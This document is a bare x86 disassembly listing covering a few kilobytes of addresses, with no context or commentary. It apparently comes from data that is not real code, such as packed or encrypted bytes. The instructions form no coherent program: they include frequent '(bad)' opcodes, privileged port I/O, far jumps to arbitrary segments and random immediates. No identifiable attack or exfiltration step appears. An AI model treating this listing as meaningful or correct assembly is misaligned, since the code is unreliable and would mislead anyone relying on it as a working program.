  427d17:	or     eax,0xf6d6653
  427d1c:	pop    ebx
  427d1d:	test   eax,0x6377a2d5
  427d22:	jp     0x427d52
  427d24:	arpl   ax,si
  427d26:	add    al,BYTE PTR [edi+edi*2-0x748fcda]
  427d2d:	std    
  427d2e:	dec    esi
  427d2f:	push   ebx
  427d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d31:	adc    edx,DWORD PTR [ebx+eax*1-0xfce3f0c]
  427d38:	arpl   WORD PTR [edx+0x70],ax
  427d3b:	adc    BYTE PTR [eax+0x4cb498ba],cl
  427d41:	or     BYTE PTR [edi+0x4],bh
  427d44:	cmc    
  427d45:	adc    DWORD PTR [ebp+0x94e675a],ecx
  427d4b:	pop    edx
  427d4c:	push   ebp
  427d4d:	fadd   st,st(1)
  427d4f:	jns    0x427db5
  427d51:	jp     0x427cf0
  427d53:	test   eax,0x2b93ab29
  427d58:	cwde   
  427d59:	frstor [esp+ebp*1+0x3c0dcf92]
  427d60:	ds inc ecx
  427d62:	(bad)  [ebx]
  427d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d65:	xor    eax,0xc84819db
  427d6a:	leave  
  427d6b:	and    ch,BYTE PTR [edx-0x463171aa]
  427d71:	mov    WORD PTR [ecx-0x2ff42fd1],es
  427d77:	adc    ebp,DWORD PTR [edx+0x1e16cc7]
  427d7d:	(bad)  
  427d7e:	pop    esi
  427d7f:	push   cs
  427d80:	mov    edx,0x834521d1
  427d85:	mov    ch,0x32
  427d87:	sub    bl,BYTE PTR [ebx]
  427d89:	sbb    eax,0x67213e1a
  427d8e:	mov    ds:0x1d4e781f,eax
  427d93:	and    BYTE PTR [eax+eiz*2+0x35],cl
  427d97:	mov    ds:0x55fcf84e,al
  427d9c:	inc    edi
  427d9d:	inc    ebx
  427d9e:	mov    ebx,0x56607074
  427da3:	retf   
  427da4:	repz fisub WORD PTR [ecx]
  427da7:	test   DWORD PTR [esi],edx
  427da9:	jne    0x427e1e
  427dab:	push   0xde914be4
  427db0:	jle    0x427d93
  427db2:	rcl    DWORD PTR [esi-0x7b],1
  427db5:	fcos   
  427db7:	jl     0x427d7e
  427db9:	pop    edi
  427dba:	mov    ecx,0x1680a758
  427dc0:	into   
  427dc1:	jnp    0x427d9a
  427dc3:	dec    esp
  427dc4:	sub    al,0x68
  427dc6:	clc    
  427dc7:	xor    DWORD PTR [eax+0x5c206b58],0x2a8a5b34
  427dd1:	in     eax,0x56
  427dd3:	pop    esi
  427dd4:	lock pop ds
  427dd6:	fdivp  st(6),st
  427dd8:	dec    ebp
  427dd9:	jle    0x427d81
  427ddb:	cli    
  427ddc:	jnp    0x427e54
  427dde:	xchg   esp,eax
  427ddf:	cmp    BYTE PTR [edx+ebx*4-0x35],ch
  427de3:	dec    eax
  427de4:	xchg   edi,eax
  427de5:	inc    ebp
  427de6:	popa   
  427de7:	add    ebx,edi
  427de9:	div    edx
  427deb:	mov    ds:0x8bc6419b,eax
  427df0:	fwait
  427df1:	(bad)  
  427df2:	jnp    0x427e3e
  427df4:	jecxz  0x427e31
  427df6:	les    ecx,FWORD PTR [edx]
  427df8:	je     0x427dfb
  427dfa:	push   edx
  427dfb:	loopne 0x427e54
  427dfd:	std    
  427dfe:	add    al,BYTE PTR ds:[edi]
  427e01:	mov    al,0x5f
  427e03:	push   si
  427e05:	xor    DWORD PTR [ebx-0x44],esp
  427e08:	repnz clc 
  427e0a:	icebp  
  427e0b:	inc    esi
  427e0c:	push   ecx
  427e0d:	(bad)  
  427e0e:	add    DWORD PTR cs:[eax+0x7],esp
  427e12:	dec    esp
  427e13:	out    dx,eax
  427e14:	mov    eax,0x2e938cb6
  427e19:	(bad)  
  427e1a:	call   0xadefd043
  427e1f:	out    dx,eax
  427e20:	aas    
  427e21:	or     BYTE PTR [edi],ch
  427e23:	xchg   edx,eax
  427e24:	out    dx,eax
  427e25:	nop
  427e26:	mov    ebx,0x611a7809
  427e2b:	jno    0x427dc7
  427e2d:	int    0x99
  427e2f:	adc    DWORD PTR [edi+0x6a8c8124],edi
  427e35:	add    BYTE PTR [ecx-0x60],dh
  427e38:	or     al,BYTE PTR [eax]
  427e3a:	(bad)  
  427e3b:	lock repnz xor ebp,DWORD PTR es:[esi+edx*1]
  427e41:	out    0x2c,al
  427e43:	mov    cl,0x83
  427e45:	hlt    
  427e46:	aas    
  427e47:	jnp    0x427df0
  427e49:	(bad)  
  427e4b:	in     eax,dx
  427e4c:	mov    eax,ds:0x34d0cec5
  427e51:	and    eax,0x86c3869b
  427e56:	inc    ebp
  427e57:	jae    0x427df4
  427e59:	outs   dx,DWORD PTR ds:[esi]
  427e5a:	sub    al,0x67
  427e5c:	mov    ebp,0x6b8bc923
  427e61:	popa   
  427e62:	inc    ebx
  427e63:	das    
  427e64:	xor    DWORD PTR [edx],edx
  427e66:	ins    DWORD PTR es:[edi],dx
  427e67:	sbb    bh,BYTE PTR [esi+0x54]
  427e6a:	hlt    
  427e6b:	ret    0x298f
  427e6e:	inc    ecx
  427e6f:	mov    eax,0x6273f5e3
  427e74:	inc    esi
  427e75:	mov    al,0x6d
  427e77:	push   0x238d731
  427e7c:	(bad)  
  427e7d:	retf   
  427e7e:	mov    bl,0xbe
  427e80:	je     0x427e5d
  427e82:	shl    DWORD PTR [edx+0x26307f90],cl
  427e88:	inc    esp
  427e89:	sub    DWORD PTR [edi+0x6c09812d],0x8585fce3
  427e93:	mov    ecx,0x7e253857
  427e98:	pop    ecx
  427e99:	repnz pusha 
  427e9b:	(bad)  
  427e9c:	adc    BYTE PTR [esi],dh
  427e9e:	mov    edi,0xd99c643a
  427ea3:	dec    ebp
  427ea4:	adc    bl,ah
  427ea6:	xor    esp,edi
  427ea8:	add    al,0x8
  427eaa:	cs cs inc esi
  427ead:	push   es
  427eae:	sbb    BYTE PTR [esp+edi*4+0x75],bh
  427eb2:	xor    ebx,DWORD PTR [ebp+0x3]
  427eb5:	jne    0x427e51
  427eb7:	shr    DWORD PTR [eax+0x17cddab9],0x20
  427ebe:	xchg   ebx,eax
  427ebf:	mov    ds:0xeb792ddc,eax
  427ec4:	adc    edi,0x5d3b4eb3
  427eca:	push   cs
  427ecb:	push   0x34
  427ecd:	mov    ecx,0x5b5e3c79
  427ed2:	dec    edx
  427ed3:	sub    DWORD PTR [ebp-0x1d469b7c],ecx
  427ed9:	repz loope 0x427eb6
  427edc:	jmp    0xb8a5:0x444b2a9a
  427ee3:	xchg   ebp,eax
  427ee4:	test   esp,ecx
  427ee6:	popf   
  427ee7:	dec    esi
  427ee8:	and    eax,0xe26193ac
  427eed:	ins    DWORD PTR es:[edi],dx
  427eee:	adc    BYTE PTR [ebx],bh
  427ef0:	pop    es
  427ef1:	(bad)  
  427ef2:	ja     0x427ece
  427ef4:	adc    ch,BYTE PTR [esi]
  427ef6:	mov    ds:0x8a8de230,al
  427efb:	gs jmp 0xbe219c6e
  427f01:	cwde   
  427f02:	and    ah,BYTE PTR [edi]
  427f04:	test   al,0x1d
  427f06:	xchg   edx,eax
  427f07:	mov    edx,0x112dcd5b
  427f0c:	repnz rol BYTE PTR [eax],cl
	...
  427f17:	add    BYTE PTR [eax],al
  427f19:	add    BYTE PTR [edx-0x107ddbc],bl
  427f1f:	(bad)  
  427f20:	fisub  DWORD PTR [esi-0x37]
  427f23:	and    dh,BYTE PTR [ecx+edx*1+0x15]
  427f27:	scas   eax,DWORD PTR es:[edi]
  427f28:	jmp    0x236a376
  427f2d:	add    ah,bh
  427f2f:	add    DWORD PTR [eax],eax
  427f31:	add    BYTE PTR [edi],bh
  427f33:	pushf  
  427f34:	add    al,0x9c
  427f36:	jmp    0x1b03599e
  427f3b:	mov    esi,0x14043b29
  427f40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f41:	jo     0x427f0a
  427f43:	and    DWORD PTR [eax-0x25],0x40
  427f47:	test   al,0xd4
  427f49:	sub    BYTE PTR [eax-0x5ccacc4a],cl
  427f4f:	dec    ebp
  427f50:	call   0x5c4:0xabd042c
  427f57:	cmp    dl,ah
  427f59:	fstp   QWORD PTR [eax-0x7ae03f10]
  427f5f:	dec    ecx
  427f60:	sbb    BYTE PTR [ecx+0x36],bl
  427f63:	add    al,0xa8
  427f65:	daa    
  427f66:	inc    esi
  427f67:	fisttp WORD PTR es:0x5b6e8f95
  427f6e:	mov    ebp,0xeaeabc2e
  427f73:	cmp    eax,0x8b806f79
  427f78:	out    dx,al
  427f79:	push   0xac752df2
  427f7e:	push   ds
  427f7f:	sbb    edi,DWORD PTR [edx+ebx*4-0x14]
  427f83:	(bad)  
  427f84:	mov    ah,0x2a
  427f86:	retf   0x48c5
  427f89:	sahf   
  427f8a:	fadd   st,st(3)
  427f8c:	cmp    BYTE PTR [edi-0x212f04a7],ch
  427f92:	aad    0x94
  427f94:	ficom  WORD PTR ss:[ecx-0x2ac2c325]
  427f9b:	ja     0x427fac
  427f9d:	in     al,dx
  427f9e:	loope  0x427ff7
  427fa0:	add    al,0x6b
  427fa2:	in     al,dx
  427fa3:	lods   al,BYTE PTR ds:[esi]
  427fa4:	loop   0x427fa3
  427fa6:	jae    0x427f5a
  427fa8:	gs aad 0x78
  427fab:	adc    eax,0xab7ef02
  427fb0:	test   eax,0x8224e5d9
  427fb5:	(bad)  
  427fb6:	cli    
  427fb7:	pop    eax
  427fb8:	mov    eax,0xc5f1c28b
  427fbd:	(bad)  
  427fbe:	dec    esi
  427fbf:	mov    ah,0xb2
  427fc1:	ss clc 
  427fc3:	xchg   esi,eax
  427fc4:	jnp    0x427f7f
  427fc6:	sbb    bl,bh
  427fc8:	pop    esi
  427fc9:	add    DWORD PTR [ecx],0xffffff94
  427fcc:	and    al,0x13
  427fce:	adc    eax,0x8f617507
  427fd3:	jnp    0x427f66
  427fd5:	fimul  WORD PTR [ebp-0x78]
  427fd8:	sti    
  427fd9:	scas   eax,DWORD PTR es:[edi]
  427fda:	mov    cl,0xb2
  427fdc:	inc    ecx
  427fdd:	push   0x5fbf0b7f
  427fe2:	xlat   BYTE PTR ds:[ebx]
  427fe3:	lea    ebx,[ecx+0x554cd883]
  427fe9:	push   ds
  427fea:	stc    
  427feb:	or     bl,0xd1
  427fee:	stos   DWORD PTR es:[edi],eax
  427fef:	add    DWORD PTR [esi+0x239afd78],esi
  427ff5:	jne    0x42803d
  427ff7:	stos   DWORD PTR es:[edi],eax
  427ff8:	scas   eax,DWORD PTR es:[edi]
  427ff9:	(bad)  
  427ffa:	stc    
  427ffb:	inc    esp
  427ffc:	adc    dh,bl
  427ffe:	inc    esp
  427fff:	push   ecx
  428000:	or     al,0x57
  428002:	mov    eax,ds:0xd9cc8993
  428007:	div    BYTE PTR [ebx+0x18]
  42800a:	dec    ecx
  42800b:	push   ds
  42800c:	sahf   
  42800d:	leave  
  42800e:	xchg   ebx,eax
  42800f:	inc    esi
  428010:	int    0xfa
  428012:	aad    0xe5
  428014:	cmp    dl,BYTE PTR [edi]
  428016:	fnstcw WORD PTR [ecx+0x8071bda]
  42801c:	jbe    0x427fb4
  42801e:	hlt    
  42801f:	stos   DWORD PTR es:[edi],eax
  428020:	aam    0xe7
  428022:	mov    DWORD PTR [eax+0x77871d],ebx
  428028:	dec    esi
  428029:	jmp    0x41ec:0xfa8a7a0c
  428030:	sub    edi,DWORD PTR ds:0xbba62f6c
  428036:	sbb    eax,0x57eb6543
  42803b:	push   ecx
  42803c:	push   edi
  42803d:	cld    
  42803e:	push   eax
  42803f:	lahf   
  428040:	fld    st(5)
  428042:	xchg   ebx,eax
  428043:	sub    dh,BYTE PTR [bp+di-0x5f]
  428047:	or     eax,0xe90b165a
  42804c:	xchg   esp,eax
  42804d:	or     BYTE PTR [ebp+esi*2+0xf],bl
  428051:	popa   
  428052:	ins    BYTE PTR es:[edi],dx
  428053:	rol    BYTE PTR [esi+0x39],1
  428056:	addr16 out dx,eax
  428058:	lods   eax,DWORD PTR ds:[esi]
  428059:	aas    
  42805a:	jmp    0xae51:0x1cf02e3f
  428061:	inc    ebp
  428062:	sahf   
  428063:	mov    ebp,DWORD PTR [ebp-0x700e3301]
  428069:	jne    0x427ffa
  42806b:	xor    DWORD PTR [edi+0x32b7b8],ecx
  428071:	retf   
  428072:	push   eax
  428073:	pusha  
  428074:	push   ecx
  428075:	add    bh,dl
  428077:	hlt    
  428078:	xor    eax,0xc36be161
  42807d:	adc    BYTE PTR [ebp-0x294b6635],0x98
  428084:	jne    0x428006
  428086:	out    dx,al
  428087:	ret    0x3db0
  42808a:	adc    DWORD PTR ds:0xd6959060,ebx
  428090:	inc    ebp
  428091:	add    ebp,ebp
  428093:	daa    
  428094:	mov    ds,WORD PTR [eax-0x6a]
  428097:	dec    esi
  428098:	(bad)  
  428099:	fnstsw WORD PTR [eax]
  42809b:	jle    0x4280c7
  42809d:	cmp    eax,0xe516fbc1
  4280a2:	ds nop
  4280a4:	shl    al,0x79
  4280a7:	or     dl,dh
  4280a9:	shl    DWORD PTR [ebx],1
  4280ab:	adc    eax,0xa8428766
  4280b0:	and    BYTE PTR [eax+0x54],cl
  4280b3:	rcl    BYTE PTR es:[esp+esi*1+0x7d],1
  4280b8:	ret    0xce9b
  4280bb:	jns    0x428095
  4280bd:	loop   0x428073
  4280bf:	mov    eax,0xb3813073
  4280c4:	inc    edi
  4280c5:	sub    dh,0x88
  4280c8:	pop    es
  4280c9:	push   0xd1f90b37
  4280ce:	retf   0x4251
  4280d1:	ror    DWORD PTR [ebx-0x7f],1
  4280d4:	shr    DWORD PTR ds:0xdeacc7a7,0x77
  4280db:	push   ds
  4280dc:	sbb    al,BYTE PTR [edi]
  4280de:	bound  edx,QWORD PTR [ecx-0x7e1465f6]
  4280e4:	not    BYTE PTR [edi-0x60]
  4280e7:	lahf   
  4280e8:	xchg   edx,eax
  4280e9:	push   edx
  4280ea:	jb     0x42811e
  4280ec:	repz jne 0x428158
  4280ef:	bound  ecx,QWORD PTR [edx+ebx*1-0x1b]
  4280f3:	sti    
  4280f4:	mov    bh,0x87
  4280f6:	mov    ebx,0xc85b09e6
  4280fb:	(bad)  [ecx-0x1b7b4d7a]
  428101:	push   edi
  428102:	xor    esp,edi
  428104:	dec    edi
  428105:	mul    DWORD PTR [ebp-0x54]
  428108:	mov    BYTE PTR [ebx],dl
  42810a:	adc    eax,0x4adf7854
  42810f:	cmp    ah,0xcb
  428112:	les    esi,FWORD PTR [ecx+0x234d66b4]
  428118:	jae    0x4280d5
  42811a:	and    al,0x43
  42811c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42811e:	sub    al,BYTE PTR [ecx-0x8890471]
  428124:	mov    esp,0x502cbf96
  428129:	cmc    
  42812a:	mov    dl,0xbf
  42812c:	pushf  
  42812d:	jno    0x42812f
	...
  428137:	add    BYTE PTR [eax],al
  428139:	add    BYTE PTR [eax+0x3fc326ab],dl
  42813f:	iret   
  428140:	cmc    
  428141:	sti    
  428142:	pushf  
  428143:	and    al,0x28
  428145:	push   ebp
  428146:	xchg   bh,dh
  428148:	jle    0x4281bd
  42814a:	and    dh,dh
  42814c:	add    DWORD PTR [eax],eax
  42814e:	cld    
  42814f:	add    DWORD PTR [eax],eax
  428151:	add    BYTE PTR [ecx+0x72],dh
  428154:	dec    ecx
  428155:	loopne 0x42810c
  428157:	or     eax,0xac7fb759
  42815c:	lahf   
  42815d:	mov    bh,0x4b
  42815f:	test   al,0x1b
  428161:	mov    dh,0xb8
  428163:	fcmovnb st,st(3)
  428165:	je     0x428112
  428167:	cli    
  428168:	inc    esi
  428169:	xlat   BYTE PTR ds:[ebx]
  42816a:	enter  0xd12f,0xdc
  42816e:	bndldx (bad),[ebx-0x347f0ab0]
  428175:	ret    
  428176:	sub    BYTE PTR [eax+0x4e],0xe
  42817a:	addr16 mov dl,0xc3
  42817d:	mov    DWORD PTR [ebp+0x7d],esp
  428180:	xor    DWORD PTR [edx+0x63],ecx
  428183:	or     eax,0xda4c2bed
  428188:	mov    eax,0xbea4c46
  42818d:	xor    eax,0xd1a277fc
  428192:	into   
  428193:	fadd   QWORD PTR [ecx]
  428195:	fs scas al,BYTE PTR es:[edi]
  428197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428198:	xchg   esi,eax
  428199:	xchg   esi,eax
  42819a:	push   cs
  42819b:	or     al,0xae
  42819d:	imul   ecx,DWORD PTR [edx+0x29],0x74
  4281a1:	pop    edx
  4281a2:	sbb    eax,0x406131e6
  4281a7:	lods   eax,DWORD PTR ds:[esi]
  4281a8:	retf   0x5acd
  4281ab:	(bad)  
  4281ac:	imul   ebp,DWORD PTR [ebx+0x1ef112cf],0x4d
  4281b3:	call   0xf5993d88
  4281b8:	and    eax,0x14b6e8b1
  4281bd:	call   0x9d4b0b91
  4281c2:	clc    
  4281c3:	hlt    
  4281c4:	mov    DWORD PTR [eax+0x2a],esi
  4281c7:	and    al,0xad
  4281c9:	imul   edx,DWORD PTR [ebp-0x667ad721],0xf00ca93c
  4281d3:	adc    eax,0x72fe030f
  4281d8:	stos   DWORD PTR es:[edi],eax
  4281d9:	jae    0x42823a
  4281db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281dc:	dec    esp
  4281dd:	mov    ds:0xb059e1f2,al
  4281e2:	sbb    DWORD PTR [edx+0x28],esi
  4281e5:	jae    0x4281d3
  4281e7:	cli    
  4281e8:	jae    0x4281bf
  4281ea:	das    
  4281eb:	or     BYTE PTR [edx],0x48
  4281ee:	xor    esi,eax
  4281f0:	xor    al,0xb7
  4281f2:	inc    ebx
  4281f3:	add    al,0xba
  4281f5:	sbb    DWORD PTR [ecx-0x234f5a4d],edi
  4281fb:	arpl   WORD PTR [ecx+0x11de62cf],di
  428201:	adc    edx,DWORD PTR [edi+0x35ec1c4d]
  428207:	and    cl,BYTE PTR [esi-0x5a]
  42820a:	cmp    BYTE PTR [eax+0x76a07afb],0xed
  428211:	or     eax,0x36fa7459
  428216:	enter  0x3fa8,0x4c
  42821a:	pop    ss
  42821b:	mov    ebx,0x6e4d3b5a
  428220:	inc    eax
  428221:	popf   
  428222:	fdiv   DWORD PTR [edx]
  428224:	(bad)  
  428225:	pop    eax
  428226:	loop   0x42829c
  428228:	mov    DWORD PTR [edx-0x45],eax
  42822b:	xchg   DWORD PTR [esi],ecx
  42822d:	cmc    
  42822e:	pushf  
  42822f:	fdivrp st(5),st
  428231:	pusha  
  428232:	push   edi
  428233:	mov    al,0x2d
  428235:	fs retf 0x48ed
  428239:	inc    edx
  42823a:	(bad)  
  42823b:	jns    0x4282ac
  42823d:	xchg   edx,eax
  42823e:	jbe    0x4282a1
  428240:	mov    dh,0x60
  428242:	sbb    al,0x78
  428244:	jge    0x42827b
  428246:	scas   al,BYTE PTR es:[edi]
  428247:	daa    
  428248:	stos   DWORD PTR es:[edi],eax
  428249:	lea    esi,ds:0x63ebb0ae
  42824f:	pop    edi
  428250:	mov    ebx,0xacb6139e
  428255:	int    0xc0
  428257:	jb     0x428262
  428259:	ja     0x4282b3
  42825b:	sbb    ebp,esi
  42825d:	call   0xa34f79e
  428262:	cmp    eax,0x38755c2b
  428267:	sar    DWORD PTR [edx-0x68b4b601],1
  42826d:	stc    
  42826e:	or     eax,0x7c5ebd5a
  428273:	loope  0x4281fc
  428275:	ret    
  428276:	and    esp,edi
  428278:	leave  
  428279:	mov    eax,0xef91e0ca
  42827e:	div    BYTE PTR [ecx+0x4cbd61b7]
  428284:	mov    WORD PTR [esi],gs
  428286:	mov    DWORD PTR [edi],ecx
  428288:	or     DWORD PTR [esp+ecx*8-0x72],0x6
  42828d:	test   DWORD PTR [edi+0x76],esp
  428290:	jp     0x4282d2
  428292:	and    al,al
  428294:	and    DWORD PTR [edi-0x5f],ebp
  428297:	push   ecx
  428298:	pop    eax
  428299:	push   esi
  42829a:	fsubr  DWORD PTR [edx-0x3d05980e]
  4282a0:	mov    cl,BYTE PTR [edi+edx*2-0x2e]
  4282a4:	adc    eax,0x155e5c44
  4282a9:	ss mov esi,DWORD PTR ds:[ebx+ebx*4-0x1c183ee7]
  4282b2:	gs test al,0x62
  4282b5:	lods   eax,DWORD PTR ds:[esi]
  4282b6:	mov    ebx,0xe148cfd0
  4282bb:	xchg   ebp,eax
  4282bc:	adc    eax,0x29dcdea0
  4282c1:	and    ebx,eax
  4282c3:	stc    
  4282c4:	mov    ch,0x37
  4282c6:	sbb    dh,al
  4282c8:	inc    bh
  4282ca:	out    0x94,al
  4282cc:	add    eax,0x79d8784e
  4282d1:	sbb    DWORD PTR [eax+edi*1+0x7f561760],esp
  4282d8:	jp     0x4282a9
  4282da:	leave  
  4282db:	sbb    edi,DWORD PTR [edx-0x142570d5]
  4282e1:	loopne 0x428349
  4282e3:	or     ebx,DWORD PTR [ebp+0x4f]
  4282e6:	inc    ecx
  4282e7:	test   al,0xb4
  4282ea:	es mov esi,0xd530eb82
  4282f0:	push   0x14
  4282f2:	push   edi
  4282f3:	xchg   ecx,eax
  4282f4:	scas   eax,DWORD PTR es:[edi]
  4282f5:	inc    eax
  4282f6:	test   al,0xf5
  4282f8:	mov    ch,0xa0
  4282fa:	cmp    eax,0xb8282bef
  4282ff:	xchg   DWORD PTR [edx+0x1947a2d4],ebx
  428305:	mov    al,ds:0x8787163c
  42830a:	je     0x428325
  42830c:	mov    DWORD PTR [edi-0x9d23865],eax
  428312:	mov    cl,0x66
  428314:	mov    cl,0x22
  428316:	shr    BYTE PTR [edi+0x9],cl
  428319:	jae    0x4282d2
  42831b:	pop    ecx
  42831c:	aam    0x40
  42831e:	aas    
  42831f:	cmc    
  428320:	jg     0x428350
  428322:	mov    ecx,DWORD PTR [edi-0x67f312c7]
  428328:	sbb    esi,DWORD PTR [ebp+0x3a]
  42832b:	jne    0x4282dc
  42832d:	mov    cs,edx
  42832f:	dec    edi
  428330:	sbb    ecx,0xa
  428333:	mov    ah,BYTE PTR [esi]
  428335:	dec    ebx
  428336:	pop    edi
  428337:	fs jo  0x428313
  42833a:	out    0xb3,al
  42833c:	cmp    BYTE PTR [edi+0x375b4f9b],dl
  428342:	ja     0x4282e4
  428344:	das    
  428345:	sub    DWORD PTR [edi+0x351dc020],edi
  42834b:	or     cl,BYTE PTR [ecx+0x62]
	...
  428359:	add    ch,bh
  42835b:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428361:	stc    
  428362:	jl     0x428396
  428364:	stc    
  428365:	jne    0x42830f
  428367:	test   DWORD PTR [esp+edi*4+0x1c],0xf00001f8
  42836f:	add    DWORD PTR [eax],eax
  428371:	add    ah,bh
  428373:	(bad)
  428376:	sub    DWORD PTR [eax],ebx
  428378:	lods   al,BYTE PTR ds:[esi]
  428379:	(bad)  
  42837a:	ds inc ebp
  42837c:	sbb    al,dl
  42837e:	adc    eax,0x98591e28
  428383:	mov    ebp,esp
  428385:	imul   ecx,DWORD PTR [ecx+0xb7361d],0xffffff99
  42838c:	jge    0x4283da
  42838e:	adc    DWORD PTR [eax-0x69],ebx
  428391:	data16 (bad) [esp+esi*8-0x5d46527d]
  428399:	push   edx
  42839a:	imul   edi,ebx,0x9c7cad92
  4283a0:	pop    es
  4283a1:	mov    ?,ecx
  4283a3:	xlat   BYTE PTR ds:[ebx]
  4283a4:	xchg   esi,eax
  4283a5:	and    edx,DWORD PTR [edi-0xf]
  4283a8:	add    bh,ah
  4283aa:	and    DWORD PTR [esi+ecx*1],ebx
  4283ad:	xor    DWORD PTR [ebx],0xb6a94e88
  4283b3:	or     dh,BYTE PTR [ecx+0x2f79407a]
  4283b9:	adc    ebx,DWORD PTR [ecx+0x53325bb6]
  4283bf:	ficom  DWORD PTR [esi]
  4283c1:	jmp    0x6fa4:0x65c77474
  4283c8:	(bad)  
  4283c9:	lock lods eax,DWORD PTR ds:[esi]
  4283cb:	xchg   esp,eax
  4283cc:	out    dx,eax
  4283cd:	xchg   ebp,eax
  4283ce:	push   0x3d
  4283d0:	dec    edx
  4283d1:	cmp    eax,0x157aa210
  4283d6:	test   BYTE PTR [ecx+0x2f],bh
  4283d9:	cs mov ch,0x8
  4283dc:	and    eax,0x64947b52
  4283e1:	call   edx
  4283e3:	pop    es
  4283e4:	enter  0xea4d,0xd
  4283e8:	cs ss mov edi,0xa3362b88
  4283ef:	call   0x784443a5
  4283f4:	mov    edx,0xa50dcfe8
  4283f9:	(bad)  
  4283fa:	adc    eax,0x9efb03f4
  4283ff:	push   eax
  428400:	mov    BYTE PTR [ebp-0x90d7f91],ah
  428406:	or     ebp,ecx
  428408:	enter  0x1d32,0x30
  42840c:	or     ebp,DWORD PTR [ebp-0x3e2a7ed9]
  428412:	(bad)  
  428413:	mov    bl,0x46
  428415:	mov    ds:0x5a16acbb,eax
  42841a:	mov    cl,0x7a
  42841c:	ret    0xccc0
  42841f:	neg    BYTE PTR [eax-0x2cabe538]
  428425:	addr16 in al,0x76
  428428:	daa    
  428429:	std    
  42842a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42842b:	outs   dx,DWORD PTR ds:[esi]
  42842c:	mov    dl,0x39
  42842e:	aad    0x5c
  428430:	push   ebp
  428431:	mov    DWORD PTR [esi-0x544d1318],ecx
  428437:	inc    ebp
  428438:	int    0x3b
  42843a:	mov    al,ds:0xf4140831
  42843f:	sub    al,BYTE PTR [ebx]
  428441:	(bad)  
  428442:	cli    
  428443:	pop    edi
  428444:	add    dh,bl
  428446:	adc    al,0x5
  428448:	pop    ss
  428449:	std    
  42844a:	dec    eax
  42844b:	rcr    DWORD PTR [ebx-0x34],1
  42844e:	sub    ch,bh
  428450:	push   ds
  428451:	lds    esp,FWORD PTR [edx+eax*4]
  428454:	mov    cl,0xfe
  428456:	mov    dl,0xf2
  428458:	sub    eax,0xc267cdb3
  42845d:	add    DWORD PTR [ebx],edx
  42845f:	imul   esi,esp,0x486c1bb8
  428465:	bswap  ebx
  428467:	add    DWORD PTR [ebx],0xffffff8a
  42846a:	test   DWORD PTR [ebx],eax
  42846c:	sbb    cl,al
  42846e:	pop    ss
  42846f:	sahf   
  428470:	jo     0x4284ef
  428472:	dec    edx
  428473:	dec    esp
  428474:	es not ch
  428477:	js     0x4284eb
  428479:	cmp    DWORD PTR [ecx+0x29],eax
  42847c:	jle    0x428459
  42847e:	nop
  42847f:	in     eax,0x16
  428481:	repnz push ebp
  428483:	sbb    BYTE PTR [ecx],0x25
  428486:	fsub   QWORD PTR [ecx+0x6]
  428489:	je     0x428439
  42848b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42848c:	aad    0xb9
  42848e:	fstp   TBYTE PTR [eax-0x1d429022]
  428494:	pop    ds
  428495:	add    BYTE PTR [edi+0x2cb147a3],0xf7
  42849c:	xchg   esp,eax
  42849d:	pop    eax
  42849e:	xchg   ecx,eax
  42849f:	loope  0x42842c
  4284a1:	(bad)  
  4284a2:	push   ds
  4284a3:	popf   
  4284a4:	in     eax,dx
  4284a5:	stos   BYTE PTR es:[edi],al
  4284a6:	enter  0x1a5b,0x3c
  4284aa:	jle    0x428464
  4284ac:	inc    edi
  4284ad:	jne    0x4284fa
  4284af:	shl    BYTE PTR [ebx+ebp*8+0x557ee8d9],cl
  4284b6:	out    0x92,al
  4284b8:	out    0x9c,al
  4284ba:	mov    dh,0x67
  4284bc:	xchg   esp,eax
  4284bd:	xor    eax,DWORD PTR [edx+0x589bc6a5]
  4284c3:	mov    bh,0x8b
  4284c5:	pop    esi
  4284c6:	(bad)  
  4284c7:	pop    ecx
  4284c8:	loopne 0x4284dd
  4284ca:	xor    BYTE PTR [ebp-0x3594e7a2],ch
  4284d0:	xor    eax,0x7d2dc5ef
  4284d5:	xor    dh,ah
  4284d7:	push   eax
  4284d8:	ret    0xd308
  4284db:	mov    cl,0x86
  4284dd:	mov    eax,0xb48c7a13
  4284e2:	sbb    al,BYTE PTR [ebx]
  4284e4:	dec    ebx
  4284e5:	loopne 0x428470
  4284e7:	cmp    DWORD PTR [ecx+0x1caec08e],eax
  4284ed:	inc    eax
  4284ee:	mov    ecx,0x480be302
  4284f3:	adc    eax,0x5298ddff
  4284f8:	sbb    BYTE PTR [edi+eiz*4],ah
  4284fb:	sub    bh,BYTE PTR [ecx-0x67]
  4284fe:	les    eax,FWORD PTR ds:0x5d2ff76a
  428504:	scas   al,BYTE PTR es:[edi]
  428505:	in     al,dx
  428506:	or     dl,bl
  428508:	mov    ch,0x1c
  42850a:	fmul   DWORD PTR [esi-0x3f]
  42850d:	jecxz  0x42852a
  42850f:	sub    ah,BYTE PTR [esi+0x53]
  428512:	mov    gs,WORD PTR [eax+0x1d]
  428515:	add    al,0xf8
  428517:	ret    
  428518:	lock popa 
  42851a:	xor    al,0x7b
  42851c:	aas    
  42851d:	adc    al,0xe9
  42851f:	and    BYTE PTR [esi+0x46],0xec
  428523:	sahf   
  428524:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428526:	cmp    esp,DWORD PTR [ebx]
  428528:	push   ebp
  428529:	ror    ebp,cl
  42852b:	test   al,0xd5
  42852d:	das    
  42852e:	lods   al,BYTE PTR ds:[esi]
  42852f:	in     al,0x9c
  428531:	lea    esi,[ebx-0x499fed21]
  428537:	mov    edi,0x754a15a9
  42853c:	(bad)  
  42853d:	pushf  
  42853e:	xchg   ebx,eax
  42853f:	mov    DWORD PTR [eax+0x1e],ebx
  428542:	scas   eax,DWORD PTR es:[edi]
  428543:	subps  xmm4,XMMWORD PTR [esp+ebx*4]
  428547:	cmp    ebp,DWORD PTR [edx-0x14]
  42854a:	xchg   edi,eax
  42854b:	mov    ah,0x65
  42854d:	ins    DWORD PTR es:[edi],dx
  42854e:	jae    0x42855d
  428550:	in     eax,dx
  428551:	or     ebp,edx
  428553:	jge    0x428501
